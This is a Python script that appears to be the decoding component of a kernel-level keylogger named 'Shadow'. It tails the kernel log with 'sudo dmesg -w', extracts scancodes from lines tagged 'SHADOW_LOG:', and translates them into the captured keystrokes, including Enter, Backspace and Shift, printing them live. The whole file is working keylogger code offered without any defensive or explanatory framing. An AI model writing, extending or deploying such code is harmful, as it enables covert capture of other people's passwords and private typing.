import subprocess
import sys


key_map = {
    30: 'a', 31: 's', 32: 'd', 33: 'f', 34: 'g', 35: 'h', 36: 'j', 37: 'k', 38: 'l',
    16: 'q', 17: 'w', 18: 'e', 19: 'r', 20: 't', 21: 'y', 22: 'u', 23: 'i', 24: 'o', 25: 'p',
    44: 'z', 45: 'x', 46: 'c', 47: 'v', 48: 'b', 49: 'n', 50: 'm',
    2: '1', 3: '2', 4: '3', 5: '4', 6: '5', 7: '6', 8: '7', 9: '8', 10: '9', 11: '0',
    57: ' [SPACE] ', 28: ' [ENTER]\n', 14: ' [BACKSPACE] ', 42: ' [SHIFT] ', 1: ' [ESC] '
}

def main():
    print("[-] Shadow Decoder Started...")
    print("[-] Listening for kernel logs (Ctrl+C to stop)...")

    
    process = subprocess.Popen(['sudo', 'dmesg', '-w'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    try:
        for line in process.stdout:
            
            if "SHADOW_LOG:" in line:
                try:
                   
                    parts = line.split("SHADOW_LOG: ")
                    code = int(parts[1].strip())
                    
                    # Translate code to character
                    char = key_map.get(code, f'[UNK:{code}]')
                    
                    # Print without newline so it looks like typing
                    sys.stdout.write(char)
                    sys.stdout.flush()
                except ValueError:
                    continue
    except KeyboardInterrupt:
        print("\n[!] Stopping decoder...")
        process.terminate()

if __name__ == "__main__":
    main()
